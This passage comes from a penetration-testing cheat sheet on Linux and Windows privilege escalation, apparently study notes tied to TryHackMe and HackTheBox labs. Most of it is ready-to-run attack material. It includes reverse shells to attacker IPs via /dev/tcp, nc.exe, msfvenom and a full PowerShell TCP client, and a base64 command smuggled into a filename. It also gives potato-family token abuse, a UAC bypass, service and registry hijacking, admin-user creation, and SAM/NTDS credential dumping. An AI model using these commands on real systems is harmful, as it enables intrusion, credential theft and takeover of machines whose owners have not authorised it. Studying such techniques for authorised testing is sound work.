- See [Task 13 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)

**Abusing Shell Features (#1)**
- See [Task 14 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- > "In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."
  - ```
    function /usr/sbin/service { /bin/bash -p; }
    export -f /usr/sbin/service
    ```

**Abusing Shell Features (#2)**
- See [Task 15 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc). Note: This doesn't work on Bash versions 4.4 and above
- > "When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements."
  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <program>`
  - `/tmp/rootbash -p`

#### <ins>Passwords & Keys</ins>
- View the content of history with `cat ~/.*history | less` and search for secrets
- Search for config files as they often contain passwords in plaintext or other reversible formats (example: `*.ovpn`)
- Search for backups and hidden files
  - `ls -la /` look for hidden files & directories in the system root
  - Other common locations to check
    - `ls -la /home/user`
    - `ls -la /tmp`
    - `ls -la /var/backups`
  - See [Task 18 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)

#### <ins>Kernel Exploits</ins>
- Enumerate the kernel version `uname -a`
- Find an exploit, example: `searchsploit linux kernel 2.6.32 priv esc`
- Some resources
  - Find possible exploits with [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
  - [Dirty COW | CVE-2016-5195](https://dirtycow.ninja/)
  - [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)

#### <ins>CVE</ins>

- see `/etc/issue`
- `cat /etc/*release*`
- CVE-2021-4034 > PwnKit Local Privilege Escalation
- Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation
- Dirty COW
  - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
  - https://dirtycow.ninja/
  - "Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka 'Dirty COW.'"
- See the general services that are running. For example, you may have found several web ports open during the initial phase, and found different services. See if there are any CVEs or exploits for PE

#### <ins>find with exec</ins>
- Also known as "Abusing Setuid Binaries"
- `find /home/username/Desktop -exec "/usr/bin/bash" -p \;`
- See more here: [find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)

#### <ins>find PE</ins>

- Example cron job running clean-tmp.sh:
  ```
  jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
  #! /bin/bash
  find /dev/shm -type f -exec sh -c 'rm {}' \;
  ```
  - Exploit:
    ```
    jane@assignment:~$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
    jane@assignment:~$ bash -p
    ```

#### <ins>Abusing capabilities</ins>
- `/usr/sbin/getcap -r / 2>/dev/null` enumerate capabilities
  - Search for `cap_setuid+ep`, meaning that setuid capabilities are enabled, effective and permitted
- Search what you need in [GTFOBins](https://gtfobins.github.io/)
  - Example with Perl: `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`


#### <ins>Escape shell</ins>

- [With tar](https://gtfobins.github.io/gtfobins/tar/#shell)
  1. create an sh with a nc command for a reverse shell > name 'exploit.sh'
  2. `touch ./"--checkpoint=1"`
  3. `touch ./"--checkpoint-action=exec=bash exploit.sh"`
- https://vk9-sec.com/linux-restricted-shell-bypass/
- https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

#### <ins>Docker</ins>

**Simple Docker cheatsheet**
```shell
docker-compose up					run docker
docker ps						see running docker
docker ps -a						see every docker in the machine
docker images						see docker images installed
docker stop <docker-id>					stop a docker
docker exec -it <docker-id> bash			enter a docker
docker rmi <docker-id>					remove a docker
```

An example: [docker-tomcat-tutorial](https://github.com/softwareyoga/docker-tomcat-tutorial)

If your user is part of the 'docker' group
- find an image with `docker images`
- `docker run -v /:/mnt --rm -it IMAGE chroot /mnt sh`

Escape container
- If the first thing you see when you get access to the machine is a file `.dockerenv` and the hostname is something like `0873e8062560`, it means that you are in a docker container
- https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/

Process
1. List host's disks
   - `fdisk -l`
2. Attempt mount `disklo`
   - `mkdir /tmp/mnt1`
   - `mount /dev/sda1 /tmp/mnt1`
   - `cd /tmp/mnt1`
3. Now you can navigate `sda1` in `/tmp/mnt1`
- If you find an internal ip / service (maybe with `ifconfig`, `netstat -ano` or `cat /etc/hosts`), try this
  1. `ssh -l root 172.17.0.2`

Docker Container Escape via SNMP
- SNMP test
  1. Look for `.snmpd.conf` (maybe in `/var/backups`)
     - found community string: `rocommunity 53cur3M0NiT0riNg`
     - Found NET-SNMP-EXTEND-MIB tables (`nsExtendConfigTable`, `nsExtendOutput1Table` and `nsExtendOutput2Table`) > this means RCE
  2. `sudo download-mibs`
  3. `set mibs +ALL in /etc/snmp/snmp.conf`
  4. `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
     - notice if the query works
- docker escape
   1. VICTIM:
      ```
      echo 'bash -c "bash -i >& /dev/tcp/192.168.45.216/4444 0>&1"' > /tmp/shtest
      chmod +x /tmp/shtest
      ```
   3. ATTACKER: `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`

#### <ins>User groups</ins>
- If your user is part of the group `disk`:
  1. `df -h`
  2. `debugfs /dev/sd[a-z][1-9]`  example: `sda1`
  3. `debugfs: cat /root/.ssh/id_rsa`
- group `video`: [HackTricks | Video Group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group)

#### <ins>fail2ban</ins>
- See: "[Privilege Escalation with fail2ban nopasswd](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)"
- fail2ban config: `/etc/fail2ban/jail.conf`
- ```
  /etc/fail2ban/action.d/iptables-multiport.conf
  actionban = reverse shell
  ```
- trigger the ban with hydra

#### <ins>Postfix</ins>

- [How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze)
- [Pg Practice Postfish writeup](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish)


### <ins>Windows Privilege Escalation</ins>

#### <ins>Checklist</ins>

See [Information gathering | Windows](#windows). Always obtain:
- [ ] Username and hostname
- [ ] Group memberships of the current user
- [ ] Existing users and groups
- [ ] Operating system, version and architecture
- [ ] Network information
- [ ] Installed applications
- [ ] Running processes

#### <ins>Resources</ins>
- [Windows PrivEsc | TryHackMe](https://tryhackme.com/room/windows10privesc)
- [Windows Privilege Escalation for OSCP & Beyond!](https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574)

**Tools**
- [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
- [MinGW-w64](https://www.mingw-w64.org/)
- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
- [Windows persistence](#windows-persistence)
- Scripts
  - [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
  - [Seatbelt](https://github.com/GhostPack/Seatbelt)
    - [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
      - `.\Seatbelt.exe all`
      - `.\Seatbelt.exe -group=all -full`
  - [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) (archived)
    - [SharpUp](https://github.com/GhostPack/SharpUp)
    - [SharpUp.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)
  - [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
  - [Windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
    - `windows-privesc-check2.exe -h`
    - `windows-privesc-check2.exe --dump -G`
  - [creddump7](https://github.com/Tib3rius/creddump7)
  - [Privesc](https://github.com/enjoiz/Privesc)

#### <ins>Strategy</ins>

- [ ] Run the following commands
  - `whoami /priv`
  - `whoami /groups`
  - `whoami /all`
  - `netstat -ano`
  - especially seek out for services like `mssql`
- [ ] See `systeminfo` for CVE + `searchsploit`, `wes.py` and `windows-exploit-suggester.py`
  - see the dedicated sections for more inspiration + known exploits
- [ ] See if something is out of place in `C:\` and `C:\Users\username\`
- [ ] See the programs installed in their directories
- [ ] Run the scripts
  - `winPEAS`, options: `fast`, `searchfast`, and `cmd`
  - `.\seatbelt.exe NonstandardProcesses`
  - `PowerUp.ps1` -> `Invoke-AllChecks`
  - `windows-privesc-check.exe --dump -G`
  - `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`
  - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
  - `.\jaws-enum.ps1`
  - [Privesc](https://github.com/enjoiz/Privesc) -> `Invoke-PrivEsc`
  - more
    - https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194
    - https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
    - https://github.com/SnaffCon/Snaffler
- [ ] With meterpreter, you can run the module `local_exploit_suggester`
- [ ] In `C:`, run the command `dir -force` to see the hidden directories
  - one interesting directory is `PSTranscripts/Transcripts`
  - keep using `dir -force` inside of the hidden directories
- [ ] Check LOLBAS: https://lolbas-project.github.io/
- [ ] If out of ideas / luck:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  - http://pwnwiki.io/#!privesc/windows/index.md
  - https://fuzzysecurity.com/tutorials/16.html

#### <ins>Privileges</ins>
- Paper: [Abusing Token Privileges For EoP](https://github.com/hatRiot/token-priv)
- List your privileges: `whoami /priv`, see also https://github.com/gtworek/Priv2Admin
  - `SeImpersonatePrivilege`
  - `SeAssignPrimaryPrivilege`
  - `SeBackupPrivilege`
  - `SeRestorePrivilege`
  - `SeTakeOwnershipPrivilege`
  - `SeTcbPrivilege`
  - `SeCreateTokenPrivilege`
  - `SeLoadDriverPrivilege`
  - `SeDebugPrivilege`
- More privs: [FindSuspiciousPermissions.ps1](https://github.com/fashionproof/FindSuspiciousPermissions/blob/main/FindSuspiciousPermissions.ps1)

**AlwaysInstallElevated**
- You can run any `.msi`

**SeLoadDriverPrivilege**
- https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#strategy
- https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
- See also [HackTheBox Fuse](https://app.hackthebox.com/machines/Fuse)

**SetRestorePrivilege**
- `./SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"`

**SeManageVolumePrivilege**
1. `.\SeManageVolumeAbuse.exe`
2. `msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f dll -o tzres.dll`
3. `cp tzres.dll C:\Windows\System32\wbem\`

**SeImpersonatePrivilege**

PrintSpoofer
- `.\PrintSpoofer.exe -i -c powershell.exe`
- `.\PrintSpoofer.exe -i -c "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`

JuicyPotato
- `.\JuicyPotato.x86.exe -t * -p "\\10.10.14.10\Share\nc.exe 10.10.14.10 88 -e cmd.exe" -l 443`
- `.\JuicyPotato.exe -t * -p C:\User\mario\root.bat -l 9001 -c {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}`
  - In `root.bat`, use the following once at time
    ```
    whoami /all > C:\Users\Public\proof.txt   <# verify that you are authority #>
    net user Administrator abc123!            <# modify Administrator password to then login with psexec #>
    ```
  - See here for CLSID for the value of the flag `-c`: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise

Other
- `.\GodPotato-NET4.exe -cmd "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`
  - Affected version: Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
- `.\RogueWinRM.exe -p "\\10.10.14.26\Share\nc.exe" -a "-e cmd.exe 10.10.14.26 88"`
  
  
**SeBackupPrivilege**
1. https://github.com/giuliano108/SeBackupPrivilege
   ```
   import-module .\SeBackupPrivilegeUtils.dll
   import-module .\SeBackupPrivilegeCmdLets.dll
   ```
2. `iwr -uri http://10.18.110.121/diskshadow.txt -o diskshadow.txt`
   - If you have modified `diskshadow.txt` and it doesn't work, run: `unix2dos diskshadow.txt`
3. `diskshadow /s diskshadow.txt`
4. `cd E:`
5. `robocopy /b E:\Windows\ntds . ntds.dit`
6. ```
   reg save hklm\system c:\tmp\system
   reg save hklm\sam c:\tmp\sam
   ```
7. ```
   download ntds.dit
   download system.bak
   download sam
   ```
8. `samdump2 system sam`
9. `impacket-secretsdump -ntds ntds.dit -system system LOCAL`


**SeRestorePrivelege**
1. list manual start service:
   ```
   cmd.exe /c sc queryex state=all type=service
   Get-Service | findstr -i "manual"
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "manual"} | select PathName,DisplayName,Name
   ```
2. Check seclogon, known to have manual start permissions and that can be started by all users
   ```
   reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
   cmd.exe /c sc sdshow seclogon
   - RP = Start Service / AU = All Users
   - winhelponline.com/blog/view-edit-service-permissions-windows/
   ```
3. SeRestoreAbuse exploit
   ```
   .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"
   ```
- See also: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#shell-as-system

#### <ins>Privileged Groups</ins>

- [Privileged Groups | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)

##### DnsAdmins
- https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
- `dnscmd.exe /config /serverlevelplugindll \\path\to\dll`
  - as a dll, try to use 'dns-exe-persistance.dll'
    - you have to recompile it with your IP
    - you can also use msfvenom
      - `msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll`
- Alternative
  1. `cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.34\share\da.dll`
  2. `sc.exe stop dns`
  3. `sc.exe start dns`
  
##### gMSA
- If your user is part of a group in 'PrincipalsAllowedToRetrieveManagedPassword'
  .\GMSAPasswordReader.exe --accountname 'svc_apache'
- Retrieve 'rc4_hmac' in Current Value
  evil-winrm -i 192.168.212.165 -u svc_apache$ -H 009E42B78BF6CEA5F5C067B32B99FCA6
- See accounts for Group Managed Service Account (gMSA) with Powershell
  Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

##### AD Recycle Bin
- It's a well-known Windows group. Check if your user is in this group
- Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
- Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
- See if there is any strange entry, like `cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz`. There might be a password

#### <ins>Add new admin user</ins>

```C
#include <stdlib.h>
int main () {
    int i;
    i = system ("net user /add [username] [password]");
    i = system ("net localgroup administrators [username] /add");
    return 0;
}
```
- 32-bit Windows executable: `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
- 64-bit Windows executable: `x86_64-w64-mingw32-gcc -o adduser.exe adduser.c`
- Note: [32-bit and 64-bit Windows: Frequently asked questions](https://support.microsoft.com/en-us/windows/32-bit-and-64-bit-windows-frequently-asked-questions-c6ca9541-8dce-4d48-0415-94a3faa2e13d)
- verify that the user has been added with `net user`
- run `echo password | runas /savecred /user:rootevil cmd`

#### <ins>Log in with another user from the same machine</ins>

```
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
```

#### <ins>Generate a reverse shell</ins>

1. Generate the reverse shell on your attacker machine: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe`
2. Transfer it to the Windows machine with SMB: `sudo python3 /opt/impacket/examples/smbserver.py kali .` and then `copy \\<IP>\kali\reverse.exe C:\PrivEsc\reverse.exe`

Create a PowerShell remoting session via WinRM
1. `$password = ConvertTo-SecureString <password> -AsPlainText -Force`
2. `$cred = New-Object System.Management.Automation.PSCredential("<password>", $password)`
3. `Enter-PSSession -ComputerName <computer_name> -Credential $cred`

Check also:
- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
  - `evil-winrm -i <IP> -u <username> -p <password>`
- [powershell_reverse_shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
  ```powershell
  # Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

  $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  ```

Other shells with msfvenom
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o shell.exe`
- `msfvenom -p windows/×64/shell_reverse_tcp LHOST=<IP> LPORT=445 -f exe -e 64/xor -o shell.exe`
- `msfvenom -f psh-cmd -p windows/shell_reverse_tc LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -f ps1 -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -p windows/shell_reverse_tcp --list formats`
- `msfvenom -p windows/shell_reverse_tcp --list-options`

 
#### <ins>Kernel Exploits</ins>

1. Save the output of the `systeminfo` command: `systeminfo > systeminfo.txt`
   - Try also the command: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
2. Use it with [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) to find potential exploits: `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less`
   - See also: [Watson](https://github.com/rasta-mouse/Watson)
3. See [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### <ins>Driver Exploits</ins>
1. Enumerate the drivers that are installed on the system: `driverquery /v`
2. Search in the Exploit Database

#### <ins>Service Exploits</ins>

Note: to find running services, use this command from the powershell: `Get-Service` or `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`

**PowerUp**
- `Get-ServiceUnquoted -Verbose` services with unquoted paths and a space in their name
- `Get-ModifiableServiceFile -Verbose` services where the current user can write to its binary path or change arguments to the binary
- `Get-ModifiableService -Verbose` services whose configuration current user can modify

**Service Commands**
```
sc.exe qc <name>                                 Query the configuration of a service
sc.exe query <name>                              Query the current status of a service
sc.exe config <name> <option>= <value>           Modify a configuration option of a service
net start/stop <name>                            Start/Stop a service
```

**Insecure Service Permissions**
1. Use AccessChk to check the "user" account's permissions on the "daclsvc" service:
   - `C:\PrivEsc\accesschk.exe /accepteula -uwcqv <user> <service>`
2. If `SERVICE_CHANGE_CONFIG` is present, it's possible to change the service configuration
3. Query the service. If it runs with `SYSTEM` privileges, it's possible a privilege escalation
   - `sc qc <service>`
   - Example: `SERVICE_START_NAME: LocalSystem`
4. Modify the service config and set the `BINARY_PATH_NAME` (binpath) to the reverse shell executable
   - `sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""`
5. Set a listener and start the service `net start <service>`

**Unquoted Service Path**

- `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
    1. Check which user is running it: `sc qc SERVICE_NAME`
    2. check it with a command similar to the following to see if you have write priv: `powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`
- If you have found an Unquoted Service Path:
  - `Get-Acl -Path "C:\Program Files (x86)\service" | Format-List`
    - see if you have write privileges (with `icacls`)
  - `"service" | Get-ServiceACL | select -ExpandProperty Access`
    - see if you can stop and start (restart) the service
  - `msfvenom -p windows/shell_reverse_tcp LHOST=10.18.110.121 LPORT=445 -f exe -o shell.exe`
  - copy the `shell.exe`, then:
    1. `sc start "service"`
    2. `Stop-Service -name "service"`
    3. `Start-Service -name "service"`

Another way
1. Check: ["Microsoft Windows Unquoted Service Path Vulnerability"](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)
2. Query a service. If it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`) and the `BINARY_PATH_NAME` value is unquoted and contains spaces, it's possible a privilege escalation
   - `sc qc <service>`
   - Example: `BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Results\unquotedpathservice.exe`
   - You can also use the Powershell command `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
3. Use AccessChk to check write permissions in this directory `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
   - You can review the permissions with `icacls "C:\"` and `icacls "C:\Program Files\Enterprise Apps"`
   - Check if you can run and stop the service with `Start-Service GammaService` and `Stop-Service`
4. Copy the reverse shell `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
5. Start a listener on the attacker machine and run the service

**Weak Registry Permissions**
1. Query a service. Check if it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`)
   - `sc qc <service>`
2. Use AccessChk to check the write permissions of the registry entry for the service
   - note: `NT AUTHORITY\INTERACTIVE` group means all logged-on users
   - `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>`
3. Overwrite the ImagePath registry key to point to the reverse shell executable: `reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
4. Start a listener on the attacker machine and run the service

**DLL Hijacking**
- See: [DLL Hijacking](#dll-hijacking)

#### <ins>CVEs</ins>

- Check if `CVE-2018-8120` works
- See programs in `Program Files` and `(x86)` and search for CVEs
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Note: Hotfix means patches, if you see N/A means that nothing has been patches
- See if you can connect as RDP to more easily find other vulnerable installed applications

**Run**
- `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`
- `python windows-exploit-suggester.py --database 2023-09-12-mssb.xls --systeminfo systeminfo.txt`
- if you can't use `systeminfo`, try `wmic qfe list full` and save it as `systeminfo.txt`
- `searchsploit Windows Server 2012 Privilege`

**Windows Server 2008**
- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

**CVE-2018-8440**
- If you see Hotfix N/A + write priv in `C:\Windows\tasks`
  - run to see if you have write priv: `icacls C:\Windows\Tasks`
- Try to run `/home/kali/Documents/windows-attack/CVE/CVE-2018-8440/Release/poc.exe`

**See the version of an exe**
- `Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force`

**Compile exploits**
- `cl 42020.cpp /EHsc /DUNICODE /D_UNICODE`
- `gcc -o output.c input.c`
- `gcc -m32 -o output.c input.c`
- `g++ your_program.cpp -o your_program`
- `i686-w64-gcc adduser.c -o adduser.exe`
- `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
- `mcs Wrapper.cs`

#### <ins>User Account Control (UAC)</ins>

Example:
- Even if we are logged in as an administrative user, we must move to a high integrity level in order to change the admin user's password.
- To do it, run the following commands
  ```PowerShell
  <# spawn a cmd.exe process with high integrity #>
  powershell.exe Start-Process cmd.exe -Verb runAs
  
  <# successfully changing the password of the admin user after spawning cmd.exe with high integrity #>
  whoami /groups
  net user admin Ev!lpass
  ```
  
UAC Bypass with `fodhelper.exe`, a Microsoft support application responsible for managing language changes in the operating system. Runs as high integrity on `Windows 10 1709`
- "[First entry: Welcome and fileless UAC bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)"
- "[UAC Bypass – Fodhelper](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)"
- `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`


#### <ins>Insecure File Permissions</ins>

Also called "Service Binary Hijacking". Exploit insecure file permissions on services that run as nt authority\system
1. List running services on Windows using PowerShell `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
2. Enumerate the permissions on the target service `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
   - For this scenario, any user (BUILTIN\Users) on the system has full read and write access to it
   - See also "[Serviio PRO 1.8 DLNA Media Streaming Server - Local Privilege Escalation](https://www.exploit-db.com/exploits/41959)"
3. Substitute `ServiioService.exe` with the following
   ```C
   #include <stdlib.h>
   int main () {
     int i;
     i = system ("net user [username] [password] /add");
     i = system ("net localgroup administrators [username] /add");
     return 0;
   }
   ```
   - `i686-w64-gcc adduser.c -o adduser.exe` or `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` to Cross-Compile the C Code to a 64-bit application
   - `move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"`
   - `move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"`
   - `dir "C:\Program Files\Serviio\bin\"`
4. Restart the service, here's two options
   - `net stop Serviio`
   - `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'Serviio'}` Obtain Startup Type for Serviio service
   - Check `Startmode` of the service with `wmic service where caption="Serviio" get name, caption, state, startmode`
   - If it's `Auto`, it means that it will restart after a reboot. Reboot with `shutdown /r /t 0 `.
5. Check if it worked with `net localgroup Administrators`

**PowerUp.ps1**
1. Check [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) and make it available with `python3 -m http.server 80`
2. Download it from the victim machine `iwr -uri http://<IP>/PowerUp.ps1 -Outfile PowerUp.ps1`
3. Run the commands `powershell -ep bypass` and `. .\PowerUp.ps1`
4. Then run `Get-ModifiableServiceFile` to display services the current user can modify
5. Run `Install-ServiceBinary -Name 'mysql'`. If it throws an error even if you already know that the current user has full access permissions on the service binary, proceed with manual exploitation


#### <ins>Registry</ins>

**AutoRuns**
1. Query the registry for AutoRun executables: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
2. Use AccessChk to check write permissions of the executables `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\<program>.exe"`
3. Overwrite the reverse shell executables in the `<program>` path: `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
4. Start a listener on the attacker machine. A new session on the victim machine will trigger a reverse shell running with admin privileges

**AlwaysInstallElevated**
1. Query the registry for AlwaysInstallElevated keys: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
   - Note if both keys are set to 1 (`0x1`)
2. Generate a reverse shell installer `.msi` with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi`
3. Transfer the installer `.msi` to the Windows machine
4. Start a listener on the attacker machine and then run the installer to trigger a reverse shell running with SYSTEM privileges: `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

#### <ins>Passwords</ins>

**Registry**
1. Search for keys and values that contain the word "password"
   - `reg query HKLM /f password /t REG_SZ /s`
   - `reg query HKCU /f password /t REG_SZ /s`
2. If you have found an admin and its password, use [winexe](https://www.kali.org/tools/winexe/) command from the attacker machine to spawn a command prompt running with the admin privileges `winexe -U 'admin%password' //<IP> cmd.exe`

**Saved Credentials**
1. Check for any saved credentials `cmdkey /list`
2. Start a listener on the attacker machine and run the reverse shell executable using `runas` with the admin user's saved credentials: `runas /savecred /user:admin C:\PrivEsc\reverse.exe` or `runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"`

**Search for Configuration Files**
1. Run the commands: `dir /s *pass* == *.config` and `findstr /si password *.xml *.ini *.txt`
2. Use winPEAS to search for common files which may contain credentials: `.\winPEASany.exe quiet cmd searchfast filesinfo`
